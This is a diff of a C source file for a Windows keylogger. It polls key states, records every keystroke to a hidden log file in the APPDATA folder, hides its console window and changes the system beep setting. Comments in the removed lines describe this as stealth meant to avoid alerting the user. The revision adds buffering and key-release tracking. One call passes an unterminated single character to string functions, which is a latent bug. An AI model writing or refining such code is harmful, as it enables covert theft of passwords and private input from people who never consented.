@@ -1,67 +1,77 @@
 #include <stdio.h>
 #include <windows.h>
+#include <string.h>
 
-// Function to log keystrokes into a hidden log file in the APPDATA directory
-int logkey(const char* log) {
-    // Buffer to store the file path
-    char path[MAX_PATH]; 
+#define BUFFER_SIZE 30
+char key_buffer[BUFFER_SIZE] = {0};
+int buffer_index = 0;
 
-    // Construct path to log.txt in APPDATA
-    snprintf(path, sizeof(path), "%s\\log.txt", getenv("APPDATA")); 
+void write_to_file(const char* log) {
+    char path[MAX_PATH];
 
-    // Open the file in append mode
-    FILE *fptr = fopen(path, "a"); 
+    snprintf(path, sizeof(path), "%s\\log.txt", getenv("APPDATA"));
 
-    // Error Catching
-    if (fptr != NULL) { 
+    FILE *fptr = fopen(path, "a");
 
-        // Write the key log to the file
-        fprintf(fptr, "%s", log); 
-
-        // Close the file
-        fclose(fptr); 
-
-        // Hide the file for stealth
+    if (fptr != NULL) {
+        fprintf(fptr, "%s", log);
+        fclose(fptr);
         SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN); 
     }
 }
 
-// Function to handle special keys using Virtual-Key codes
+void logkeys(const char* log) {
+    int len = strlen(log);
+    if (buffer_index + len >= BUFFER_SIZE) {
+        write_to_file(key_buffer);
+        buffer_index = 0;
+        key_buffer[0] = '\0';
+    }
+    strcpy(key_buffer + buffer_index, log);
+    buffer_index += len;
+}
+
 int handlespecialkeys(int key) {
     switch (key) {
-        case VK_SPACE: logkey(" "); return 1; // Log space as " "
-        case VK_RETURN: logkey("\n"); return 1; // Log Enter as a newline
-        case VK_SHIFT: logkey("[Shift]"); return 1; // Log Shift
-        case VK_BACK: logkey("[BackSpace]"); return 1; // Log Backspace
-        case VK_RBUTTON: logkey("[Right Click]"); return 1; // Log right mouse button
-        case VK_CAPITAL: logkey("[Capslock]"); return 1; // Log Caps Lock
-        case VK_TAB: logkey("[Tab]"); return 1; // Log Tab key
-        case VK_UP: logkey("[Up Arrow]"); return 1; // Log Up arrow key
-        case VK_DOWN: logkey("[Down Arrow]"); return 1; // Log Down arrow key
-        case VK_LEFT: logkey("[Left Arrow]"); return 1; // Log Left arrow key
-        case VK_RIGHT: logkey("[Right Arrow]"); return 1; // Log Right arrow key (Fixed missing bracket)
-        case VK_CONTROL: logkey("[Ctrl]"); return 1; // Log Control key
-        case VK_MENU: logkey("[Alt]"); return 1; // Log Alt key
-        default: return 0; // Return 0 for regular alphanumeric keys
+        case VK_SPACE:     logkeys(" ");         return 1;
+        case VK_RETURN:    logkeys("\n");        return 1;
+        case VK_SHIFT:     logkeys("[Shift]");   return 1;
+        case VK_BACK:      logkeys("[Backspace]"); return 1;
+        case VK_TAB:       logkeys("[Tab]");     return 1;
+        case VK_CONTROL:   logkeys("[Ctrl]");    return 1;
+        case VK_MENU:      logkeys("[Alt]");     return 1;
+        default: return 0;
     }
 }
 
-int main() {
-    // Disable system beep sound to avoid alerting the user
-    SystemParametersInfo(SPI_SETBEEP, 0, 0, SPIF_SENDCHANGE);
+void process_key(int key, short pressed_keys[]) {
+    if (!pressed_keys[key]) {  // Check if key was previously unpressed
+        pressed_keys[key] = 1;
 
-    // Hide the console window so the program runs in the background
+        if (!handlespecialkeys(key)) {  
+                char character = (char)key;
+                logkeys(&character);
+        }
+    }
+}
+
+
+int main() {
+    SystemParametersInfo(SPI_SETBEEP, 0, 0, SPIF_SENDCHANGE);
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    while (1) { // Infinite loop to monitor keystrokes
-        Sleep(10); // Reduce CPU usage by adding a small delay
-        for (int key = 8; key <= 190; key++) { // Loop through possible key values
-            if (GetAsyncKeyState(key) & 0x8000) { // Check if the key is being pressed
-                if (!handlespecialkeys(key)) { // If it's not a special key, log it as a regular character
-                    char character = (char)key; 
-                    logkey(&character); // Log the keypress
-                }
+    short pressed_keys[256] = {0};
+    
+    while (1) {
+        Sleep(20);
+        for (int key = 8; key <= 190; key++) {
+            if (GetAsyncKeyState(key) & 0x8000) {
+                process_key(key, pressed_keys);
+            } else {
+                pressed_keys[key] = 0;  // Reset when key is released
             }
         }
     }
+
+    return 0;
 }
